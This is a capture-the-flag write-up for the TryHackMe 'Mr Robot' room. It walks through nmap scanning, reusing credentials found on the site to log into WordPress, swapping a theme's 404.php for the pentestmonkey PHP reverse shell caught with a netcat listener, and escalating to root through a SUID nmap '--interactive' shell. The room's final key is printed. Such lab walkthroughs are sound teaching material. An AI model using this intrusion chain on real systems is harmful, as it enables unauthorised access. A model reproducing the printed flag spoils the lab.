# Mr Robot CTF

[Room Link](https://tryhackme.com/room/mrrobot)

`nmap -A -sV -vv -T4 10.10.218.220`

nmap as usual

```
PORT    STATE  SERVICE  REASON       VERSION
22/tcp  closed ssh      conn-refused
80/tcp  open   http     syn-ack      Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
443/tcp open   ssl/http syn-ack      Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
| SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
|_http-server-header: Apache
```

![image](https://github.com/user-attachments/assets/b5918dab-8c99-4f68-9e32-28ead8690e6e)

It's a high effort website, can explore the commands the good stuffs
I couldn't find anything useful for the CTF

Naturally I checked robots and license files

![image](https://github.com/user-attachments/assets/ce1a4b8f-7af8-42d5-bd33-36c59af7238f)
![image](https://github.com/user-attachments/assets/39e72006-a0d6-4b59-925a-c334ac6969c2)

On inspecting license part of the website

![image](https://github.com/user-attachments/assets/31694527-a101-4891-a72d-a5cf44d02f56)
![image](https://github.com/user-attachments/assets/73571d40-8672-44d0-919d-39582b69b2b7)

Some credentials, we will take a note

Ran dirbuster


![image](https://github.com/user-attachments/assets/fcf0f684-efb7-4f81-bf8f-52db76713e0f)

wp-login


![image](https://github.com/user-attachments/assets/d933f1b0-3096-408d-a24a-7626ddab1ebe)

Logging in using the found credentials


![image](https://github.com/user-attachments/assets/af9536d3-d8f3-4242-b531-aea27392580b)

LURK LURK LURK
TRY TRY TRY


![image](https://github.com/user-attachments/assets/a4ec5c33-7929-4b1a-8419-733fbbbf19ea)

I did and this was the result most of the time


![image](https://github.com/user-attachments/assets/081dd022-c205-4e72-b655-5b7dfba36024)

After digging deeper, I came across this
Editable, executable php files

Now, I used [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
replaced the file

`http://10.10.218.220/wp-includes/themes/TwentyFifteen/404.php`

`nc -lvnp 4443`


![image](https://github.com/user-attachments/assets/db94388a-d2d8-48ee-a434-d5d659b6a887)

Second key

Moving forward I figured that we need to privesc

```
$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
as `sudo -l` didn't work

we have nmap
checking in gtfobins


![image](https://github.com/user-attachments/assets/fcc44fd0-4fea-41ef-bcba-c239de139044)

tried both methods but only second one worked

```
$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
cd root
ls
firstboot_done
key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```













